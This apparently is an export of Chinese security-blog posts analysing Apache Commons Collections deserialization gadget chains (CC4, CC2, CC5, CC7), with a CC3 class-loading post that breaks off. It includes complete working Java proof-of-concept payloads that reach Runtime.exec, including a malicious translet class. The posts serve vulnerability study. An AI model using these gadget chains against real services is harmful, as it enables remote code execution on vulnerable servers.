[{"title":"漏洞篇 - Java 反序列化之 CC4+CC2+CC5+CC7 链","path":"/2024/06/05/Java 安全/漏洞篇-CC4+CC2+CC5+CC7链分析/","content":"CC4 链在 Commons Collections 版本为 3.2.1 的背景下，可以使用 TransformedMap 或者 LazyMap 来执行 transform 方法，但当 Commons Collections 的版本提升到 4.0 时，就又多出了一种办法：利用 TransformingComparator 来执行 transform 方法。 先前我们将 AnnotationInvocationHandler 和 HashMap 作为入口类，利用它们的 readObject 方法来反序列化，但是现在我们还可以利用 PriorityQueue 的 readObject 来反序列化。 实验环境 java &#x3D; 8u65 CommonsCollections &#x3D; 4.0 pom.xml 中导入如下依赖： 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt;&lt;/dependency&gt; 利用链之 TransformingComparator在 CommonsCollections 4.0 版本中，TransformingComparator 实现了 Serializable 接口，可以被序列化，而在 3.2.1 版本中是不可序列化的。 TransformingComparator 的 compare 方法中就调用了 transform 方法： 12345public int compare(I obj1, I obj2) &#123; O value1 = this.transformer.transform(obj1); O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2);&#125; transformer 是 TransformingComparator 中定义的属性： 1private final Transformer&lt;? super I, ? extends O&gt; transformer; 这个属性在构造方法中被赋值： 1234public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated) &#123; this.decorated = decorated; this.transformer = transformer;&#125; 另一个构造方法又调用了这个构造方法： 123public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer) &#123; this(transformer, ComparatorUtils.NATURAL_COMPARATOR);&#125; 都是 public ，好说。 入口类之 PriorityQueuePriorityQueue#siftDownUsingComparator()PriorityQueue 类的 siftDownUsingComparator 方法调用了 comparator 的 compare 方法： 12345678910111213141516private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x;&#125; comparator 是 PriorityQueue 中定义的成员属性： 1private final Comparator&lt;? super E&gt; comparator; 在构造方法中被赋值： 123456789public PriorityQueue(int initialCapacity, Comparator&lt;? super E&gt; comparator) &#123; // Note: This restriction of at least one is not actually needed, // but continues for 1.5 compatibility if (initialCapacity &lt; 1) throw new IllegalArgumentException(); this.queue = new Object[initialCapacity]; this.comparator = comparator;&#125; 这个构造方法又被另一个构造方法调用： 123public PriorityQueue(Comparator&lt;? super E&gt; comparator) &#123; this(DEFAULT_INITIAL_CAPACITY, comparator);&#125; 只需要将 PriorityQueue 的 comparator 属性赋值成 TransformingComparator 对象即可。 PriorityQueue#siftDown()PriorityQueue 的 siftDown 方法调用了 siftDownUsingComparator 方法： 123456private void siftDown(int k, E x) &#123; if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x);&#125; PriorityQueue#heapify()PriorityQueue 的 heapify 方法调用了 siftDown 方法： 1234private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]);&#125; 但是通过代码我们可以发现，进入 for 循环的条件是 (size &gt;&gt;&gt; 1) - 1 &gt;= 0 ，意思就是将 size 的二进制位无符号右移一位（高位用 0 补全）再减去 1 要大于等于 0 ，故而 size 要大于等于 2 。 size 是 PriorityQueue 中定义的属性，初始值为 0： 1private int size = 0; 想要增加 size 的值，可以通过 PriorityQueue 的 offer 方法： 1234567891011121314public boolean offer(E e) &#123; if (e == null) throw new NullPointerException(); modCount++; int i = size; if (i &gt;= queue.length) grow(i + 1); size = i + 1; if (i == 0) queue[0] = e; else siftUp(i, e); return true;&#125; 从代码中可以看出，offer 方法每被调用一次，size 都会在原来的基础上加 1 。 当然也可以使用 PriorityQueue 的 add 方法，add 方法调用了 offer 方法： 123public boolean add(E e) &#123; return offer(e);&#125; 至于这里为什么不直接用反射修改呢，原因是 size 表示的是这个优先队列中元素的个数： 如果不往这个优先队列中添加元素，而是直接暴力反射修改 size 的值，那么在序列化时将会报错，导致反序列化无法进行。 具体可以看 PriorityQueue 的 writeObject 方法： 123456789101112private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException &#123; // Write out element count, and any hidden stuff s.defaultWriteObject(); // Write out array length, for compatibility with 1.5 version s.writeInt(Math.max(2, size + 1)); // Write out all elements in the &quot;proper order&quot;. for (int i = 0; i &lt; size; i++) s.writeObject(queue[i]);&#125; PriorityQueue#readObject()PriorityQueue 的 readObject 方法调用了 heapify 方法： 123456789101112131415161718private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); queue = new Object[size]; // Read in all elements. for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in &quot;proper order&quot;, but the // spec has never explained what that might be. heapify();&#125; 调用栈总结12345678910111213PriorityQueue#readObject() PriorityQueue#heapify() PriorityQueue#siftDown() PriorityQueue#siftDownUsingComparator() TransformingComparator#compare() ChainedTransformer#transform() ConstantTransformer#transform() InstantiateTransformer#transform() TrAXFilter#TrAXFilter() TemplatesImpl#newTransformer() TemplatesImpl#getTransletInstance() TemplatesImpl#defineTransletClasses() TransletClassLoader#defineClass() payloadEval 类： 123456789101112131415161718192021222324252627282930import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;import java.io.Serializable;public class Eval extends AbstractTranslet &#123; // 恶意代码放在静态代码块中 static &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; &#125; // 需要重写父类的两个方法 @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; 执行程序： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CC4 &#123; public static void main(String[] args) &#123; try&#123; // 初始化 TemplatesImpl 对象 TemplatesImpl templates = new TemplatesImpl(); // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件 byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\\\Users\\\\miaoj\\\\Documents\\\\Java安全代码实验\\\\CC2457test\\\\target\\\\classes\\\\com\\\\miaoji\\\\Eval.class&quot;)); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;); // _name 不为空 setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;); // 利用 ChainedTransformer 执行 templates.newTransformer() Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 利用 TransformingComparator 执行 transform 方法 TransformingComparator comparator = new TransformingComparator(chainedTransformer); // 初始化入口类 PriorityQueue PriorityQueue priorityQueue = new PriorityQueue(2); // 向 priorityQueue 中添加元素，使得元素个数 size 增加 priorityQueue.add(1); priorityQueue.add(1); // 在 add 调用完之后，再反射修改 comparator 属性为 TransformingComparator 对象 Object[] objects = new Object[]&#123;templates, null&#125;; setFieldValue(priorityQueue, &quot;comparator&quot;, comparator); // 序列化成字节数组 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(priorityQueue); oos.flush(); oos.close(); // 反序列化字节数组 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; //反射设置 Field public static void setFieldValue(Object object, String fieldName, Object value) &#123; try &#123; Field field = object.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(object, value); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 这里需要再说明一下，为什么不在构造方法中将 PriorityQueue 的 comparator 属性为 TransformingComparator 对象呢？因为 add 方法会提前调用 comparator.compare() ，造成序列化时命令执行，具体调用如下： 123456789PriorityQueue#add() -&gt; PriorityQueue#offer() -&gt; PriorityQueue#siftUp() -&gt; PriorityQueue#siftUpUsingComparator() -&gt; PriorityQueue.comparator#compare() 所以 payload 是在 add 方法调用完后再将 comparator 属性赋值。 CC2 链CC2 链与 CC4 链的相同之处在于它们都将 PriorityQueue 作为入口类，利用 TransformingComparator#compare() 来调用 transform 方法。不同之处在于 CC2 链用 InvokerTransformer 代替 TrAXFilter + InstantiateTransformer 来执行 TemplatesImpl#newTransformer() 调用栈总结123456789101112PriorityQueue#readObject() PriorityQueue#heapify() PriorityQueue#siftDown() PriorityQueue#siftDownUsingComparator() TransformingComparator#compare() ChainedTransformer#transform() ConstantTransformer#transform() InvokerTransformer#transform() TemplatesImpl#newTransformer() TemplatesImpl#getTransletInstance() TemplatesImpl#defineTransletClasses() TransletClassLoader#defineClass() payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CC2 &#123; public static void main(String[] args) &#123; try&#123; // 初始化 TemplatesImpl 对象 TemplatesImpl templates = new TemplatesImpl(); // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件 byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\\\Users\\\\miaoj\\\\Documents\\\\Java安全代码实验\\\\CC2457test\\\\target\\\\classes\\\\com\\\\miaoji\\\\Eval.class&quot;)); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;); // _name 不为空 setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;); // 利用 ChainedTransformer 执行 templates.newTransformer() Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;, null,null) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 利用 TransformingComparator 执行 transform 方法 TransformingComparator comparator = new TransformingComparator(chainedTransformer); // 初始化入口类 PriorityQueue PriorityQueue priorityQueue = new PriorityQueue(2); // 向 priorityQueue 中添加元素，使得元素个数 size 增加 priorityQueue.add(1); priorityQueue.add(1); // 在 add 调用完之后，再反射修改 comparator 属性为 TransformingComparator 对象 Object[] objects = new Object[]&#123;templates, null&#125;; setFieldValue(priorityQueue, &quot;comparator&quot;, comparator); // 序列化成字节数组 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(priorityQueue); oos.flush(); oos.close(); // 反序列化字节数组 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; //反射设置 Field public static void setFieldValue(Object object, String fieldName, Object value) &#123; try &#123; Field field = object.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(object, value); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; CC5 链CC5 链将 BadAttributeValueExpException#readObject() 作为入口，利用 TiedMapEntry#tostring() 来调用 LazyMap#get() ，进而调用 transform 方法。 实验环境 java &#x3D; 8u65 CommonsCollections &#x3D; 3.2.1 pom.xml 中导入如下依赖： 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; 利用链之 TiedMapEntry前面在使用 TiedMapEntry 时，用的是它的 getValue 方法来调用其成员属性 map 的 get 方法： 123public Object getValue() &#123; return map.get(key);&#125; TiedMapEntry 的 toString 方法又调用了 getValue 方法： 123public String toString() &#123; return getKey() + &quot;=&quot; + getValue();&#125; 入口类之 BadAttributeValueExpExceptionBadAttributeValueExpException 的 readObject 方法调用了 valObj 的 toString 方法： 123456789101112131415161718192021private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(&quot;val&quot;, null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName(); &#125;&#125; 我们看看 valObj 是怎么来的： ObjectInputStream.GetField gf = ois.readFields(); ois：一个 ObjectInputStream 实例，用于从输入流中读取对象。 readFields()：读取对象的字段，并返回一个 ObjectInputStream.GetField 对象，这个对象包含了序列化对象的字段和值。 Object valObj = gf.get(&quot;val&quot;, null); gf：前面获取的 ObjectInputStream.GetField 对象。 get(“val”, null)：从 gf 中获取名为 val 的字段值。如果 val 字段不存在，则返回 null。 所以说，valObj 的值就是 val 的值，而 val 是 BadAttributeValueExpException 中定义的属性： 1private Object val; 所以我们只需要将 val 赋值成 TiedMapEntry 对象即可。 但是我们并不能用构造方法赋值，因为构造方法会提前调用 val 的 toString 方法，造成命令执行： 123public BadAttributeValueExpException (Object val) &#123; this.val = val == null ? null : val.toString();&#125; 所以这里选择反射修改 val 的值。 再来看判断，调用 valObj.toString() 的前提是： 12345678System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean 这个式子返回 true 。若 valObj 为 TiedMapEntry 对象，则所有的 instanceof 判断均为 false 。System.getSecurityManager() 作用是获取当前 Java 虚拟机 (JVM) 安装的 SecurityManager（ Java 中的一种安全机制，用于在运行时对代码进行安全检查），默认情况下是没有安装的，所以返回 null ，那么上述判断默认情况下为 true 。 当然也就可以知道：理论上，如果受害者安装了 SecurityManager ，CC5 链就行不通。 调用栈总结12345678BadAttributeValueExpException#readObject() TiedMapEntry#toString() TiedMapEntry#getValue() LazyMap#get() ChainedTransformer#transform() ConstantTransformer#transform() InvokerTransformer#transform() Runtime#exec() payloadCC5 链还是采用 InvokerTransformer 命令执行的办法。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class CC5 &#123; public static void main(String[] args) throws Exception &#123; // 利用 ChainedTransformer 执行 Runtime.getRuntime.exec(&quot;calc&quot;) Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; Transformer chainedTransformer = new ChainedTransformer(transformers); // 利用 LazyMap 的 get 方法执行 ChainedTransformer 的 transform 方法 Map uselessMap = new HashMap(); Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer); // 利用 TiedMapEntry 的 toString 方法执行 LazyMap 的 get 方法 TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;test&quot;); // 利用 BadAttributeValueExpException 的 readObject 方法执行 TiedMapEntry 的 toString 方法 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); // 反射设置 val ，不在构造方法中设置 val 是为了避免提前代码执行 Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(badAttributeValueExpException, tiedMapEntry); // 序列化成字节数组 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(badAttributeValueExpException); oos.flush(); oos.close(); // 反序列化字节数组 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); &#125;&#125; CC7 链CC7 链将 Hashtable#readObject() 作为入口，利用 AbstractMap#equals() 来调用 LazyMap#get() ，进而调用 transform 方法。 利用链之 AbstractMapAbstractMap 的 equals 方法调用了 m 的 get 方法： 1234567891011121314151617181920212223242526272829303132public boolean equals(Object o) &#123; if (o == this) return true; if (!(o instanceof Map)) return false; Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o; if (m.size() != size()) return false; try &#123; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) &#123; Entry&lt;K,V&gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) &#123; if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false; &#125; else &#123; if (!value.equals(m.get(key))) return false; &#125; &#125; &#125; catch (ClassCastException unused) &#123; return false; &#125; catch (NullPointerException unused) &#123; return false; &#125; return true;&#125; 来看 m 在 equals 方法中的定义： 1Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o; 所以只要将传入的 o 设置成 LazyMap 对象就好了。 利用链之 AbstractMapDecoratorAbstractMapDecorator 的 equals 方法会调用 map 的 equals 方法： 123456public boolean equals(Object object) &#123; if (object == this) &#123; return true; &#125; return map.equals(object);&#125; map 是 AbstractMapDecorator 中定义的成员属性： 1protected transient Map map; 在构造方法中被赋值： 123456public AbstractMapDecorator(Map map) &#123; if (map == null) &#123; throw new IllegalArgumentException(&quot;Map must not be null&quot;); &#125; this.map = map;&#125; 可以将 map 赋值成 AbstractMap 对象。 入口类之 HashtableHashtable 的 reconstitutionPut 方法调用了 e.key.equals() ： 123456789101112131415161718192021private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value) throws StreamCorruptedException&#123; if (value == null) &#123; throw new java.io.StreamCorruptedException(); &#125; // Makes sure the key is not already in the hashtable. // This should not happen in deserialized version. int hash = key.hashCode(); int index = (hash &amp; 0x7FFFFFFF) % tab.length; for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; throw new java.io.StreamCorruptedException(); &#125; &#125; // Creates the new entry. @SuppressWarnings(&quot;unchecked&quot;) Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index]; tab[index] = new Entry&lt;&gt;(hash, key, value, e); count++;&#125; 这里需要注意几个点： 一是 value 需要不为空，否则抛出异常； 二是 for 循环中的 if 判断条件 (e.hash &#x3D;&#x3D; hash) &amp;&amp; e.key.equals(key) ，使用 &amp;&amp; 符号，具有短路特性，也就是说只有左边的式子返回 true ，右边的式子才会执行。 Hashtable 的 value 属性可以通过 put 方法赋值； 要调用到 e.key.equals() 我们需要保证 e.key 是一个 AbstractMapDecorator 对象，但是 AbstractMapDecorator 是一个抽象类，并不能直接 new 对象，已知 LazyMap 继承了 AbstractMapDecorator 这个抽象类，所以可以考虑将 e.key 赋值为 LazyMap 对象； e 是传入的参数 Entry[] tab 数组的某一个键值对，想知道这个 tab 是什么，还得往后看。 Hashtable 的 readObject 方法调用了 reconstitutionPut 方法： 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException&#123; // Read in the length, threshold, and loadfactor s.defaultReadObject(); // Read the original length of the array and number of elements int origlength = s.readInt(); int elements = s.readInt(); // Compute new size with a bit of room 5% to grow but // no larger than the original size. Make the length // odd if it&#x27;s large enough, this helps distribute the entries. // Guard against the length ending up zero, that&#x27;s not valid. int length = (int)(elements * loadFactor) + (elements / 20) + 3; if (length &gt; elements &amp;&amp; (length &amp; 1) == 0) length--; if (origlength &gt; 0 &amp;&amp; length &gt; origlength) length = origlength; table = new Entry&lt;?,?&gt;[length]; threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1); count = 0; // Read the number of elements and then all the key/value objects for (; elements &gt; 0; elements--) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K)s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V)s.readObject(); // synch could be eliminated for performance reconstitutionPut(table, key, value); &#125;&#125; 可以看到传入 reconstitutionPut 方法的第一个参数是 table ，table 是 Hashtable 中定义的一个属性： 1private transient Entry&lt;?,?&gt;[] table; 这个属性被 transient 修饰，不能参加序列化，也就是说反序列化通过 Hashtable 的 readObject 方法第一次调用 reconstitutionPut 方法时，table 至少是没有值的。 再放一遍 reconstitutionPut 代码： 回到前面的问题，第一次调用 reconstitutionPut 方法时 table 为空，故而 for 循环中取到的 e 为空，直接跳出 for 循环，进行后面的赋值： 12Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];tab[index] = new Entry&lt;&gt;(hash, key, value, e); 这里调用了 Entry 的构造方法，会将其成员属性 hash 赋值为前面调用 key.hashCode() 算出来的 hash 值。 Entry 是 Hashtable 中的一个静态内部类，其构造方法如下： 第一次 reconstitutionPut 方法被调用完后，会回到 readObject 方法的循环中，Hashtable 中的键值对有多少个，这个 for 循环就执行多少次，reconstitutionPut 方法就被调用多少次，那么如果在 Hashtable 中放入两个 LazyMap 对象： 12hashtable.put(lazyMap1, &quot;test&quot;);hashtable.put(lazyMap2, &quot;test&quot;); reconstitutionPut 方法自然会执行两次，第二次调用时，tab[index] 就有值了，且只有一个值，就是 lazyMap1 &#x3D;&gt; “test” ，我们又知道，hash 是调用 key.hashCode() 得到的，lazyMap1.hashCode() 会调用其父类 AbstractMapDecorator 的 hashCode() 方法，并最终会调用其成员属性 map 的 hashCode() 方法。 若 map 是 HashMap 对象，则会调用 HashMap 的 hashCode() 方法，这个方法在其静态内部类 Node&lt;K,V&gt; 中： 123public final int hashCode() &#123; return Objects.hashCode(key) ^ Objects.hashCode(value);&#125; 可以看到，HashMap 的 hashCode() 方法是分别计算其 key 的 hash 和 value 的 hash 再相乘得到的。 接下来需要使判断 e.hash == hash 返回 true ，即使 lazyMap1.hashCode() == lazyMap2.hashCode() 成立。但是 lazyMap1 与 lazyMap2 又不能完全一样，因为 hashtable.put 在往 hashtable 对象里添加键值对的时候，如果键一样的话，会将值替换掉，如果 lazyMap1 与 lazyMap2 完全一样，那么第二个 put 就只会做替换，这样 hashtable 对象里面就仍然只有一个键值对。 所以这里我们沿用前辈们的思路： 12lazyMap1.put(&quot;yy&quot;, 1);lazyMap2.put(&quot;zZ&quot;, 1); 由于 “yy” 与 “zZ” 算出来的 hash 值一样，所以这样设置好两个 LazyMap 对象中的 map 属性之后，hashCode() 方法得出来的结果是一样的。 最后一点就是，hashtable 的 put 方法会提前调用 equals 方法： 1234567891011121314151617181920212223public synchronized V put(K key, V value) &#123; // Make sure the value is not null if (value == null) &#123; throw new NullPointerException(); &#125; // Makes sure the key is not already in the hashtable. Entry&lt;?,?&gt; tab[] = table; int hash = key.hashCode(); int index = (hash &amp; 0x7FFFFFFF) % tab.length; @SuppressWarnings(&quot;unchecked&quot;) Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index]; for(; entry != null ; entry = entry.next) &#123; if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123; V old = entry.value; entry.value = value; return old; &#125; &#125; addEntry(hash, key, value, index); return null;&#125; 仔细观察上述代码，发现跟 reconstitutionPut 方法很像，所以为了防止提前命令执行，先传入一个空的 Transformer 到 LazyMap 即可。 有了上述的结论，就可以开始书写 payload 了。 payload1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Hashtable;import java.util.Map;public class CC7 &#123; public static void main(String[] args) throws Exception &#123; // 利用 ChainedTransformer 执行 Runtime.getRuntime.exec(&quot;calc&quot;) Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; // 先传入空的 Transformer 数组，防止 put 时命令执行 Transformer[] transformers1 = new Transformer[]&#123;&#125;; Transformer chainedTransformer = new ChainedTransformer(transformers1); // 新建两个 HashMap 作为传入的参数 Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); // 新建两个 LazyMap ，确保 hashCode() 结果一样 Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer); lazyMap1.put(&quot;yy&quot;, 1); Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer); lazyMap2.put(&quot;zZ&quot;, 1); // 新建入口类 Hashtable Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, &quot;test1&quot;); hashtable.put(lazyMap2, &quot;test2&quot;); // 通过反射设置 transformer 数组 Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;); field.setAccessible(true); field.set(chainedTransformer, transformers); //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=&gt;yy，所以这里要移除 lazyMap2.remove(&quot;yy&quot;); // 序列化成字节数组 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(hashtable); oos.flush(); oos.close(); // 反序列化字节数组 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); &#125;&#125; 调用栈总结梳理调用栈之前，先知道两件事： LazyMap 继承了 AbstractMapDecorator HashMap 继承了 AbstractMap 123456789Hashtable#readObject()\t-&gt;Hashtable#reconstitutionPut()\t-&gt;Hashtable#reconstitutionPut() LazyMap#equals() -- 即 AbstractMapDecorator#equals() HashMap#equals() -- 即 AbstractMap#equals() LazyMap#get() ChainedTransformer#transform() InvokerTransformer#transform() Runtime#exec() 参考文章CC链 1-7 分析 https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#CUjq4","categories":["Java 安全"]},{"title":"漏洞篇 - Java 反序列化之 CC3 链","path":"/2024/05/27/Java 安全/漏洞篇-CC3链分析/","content":"CC3 链的核心在于利用 TemplatesImpl 加载恶意类时执行静态代码块。 CC3 链分析在分析 CC3 链之前，我们需要再深入地了解一下 Java 的类加载机制。虽然我前面有提到 Java 类加载的几种方式，但是这里还是需要再深入了解一下。 推荐博客：Java 基础篇-类加载机制 ​ ClassLoader，吃透它看这一篇就够了 自定义类加载器实现一个自定义类加载器需要继承 ClassLoader ，同时覆盖 findClass 方法。 ClassLoader 里面有三个重要的方法 loadClass() 、findClass() 和 defineClass() 。 loadClass() 方法是加载目标类的入口，它首先会查找当前 ClassLoader 以及它的双亲里面是否已经加载了目标类，如果没有找到就会让双亲尝试加载，如果双亲都加载不了，就会调用 findClass() 让自定义加载器自己来加载目标类。ClassLoader 的 findClass() 方法是需要子类来覆盖的，不同的加载器将使用不同的逻辑来获取目标类的字节码。拿到这个字节码之后再调用 defineClass() 方法将字节码转换成 Class 对象。 双亲委派机制想要自定义类加载器，一定需要了解双亲委派模型 双亲委派机制原理如下： 